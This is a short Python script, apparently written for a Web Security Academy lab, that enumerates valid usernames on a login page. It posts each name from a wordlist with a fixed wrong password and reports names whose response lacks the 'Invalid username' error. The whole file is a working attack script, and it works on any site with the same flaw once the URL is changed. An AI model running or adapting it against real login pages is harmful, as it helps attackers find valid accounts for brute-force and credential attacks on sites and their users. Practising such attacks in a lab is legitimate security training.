import requests

url = "https://0a72006204d164fe8089c1fd00df002a.web-security-academy.net/login"

with open("usernames.txt") as f:
    for line in f:
        username = line.strip()
        response = requests.post(url, data={"username": username, "password": "wrongpassword123"})
        print(f"check: {username}") 
        if "Invalid username" not in response.text:
            print(f"find: {username}")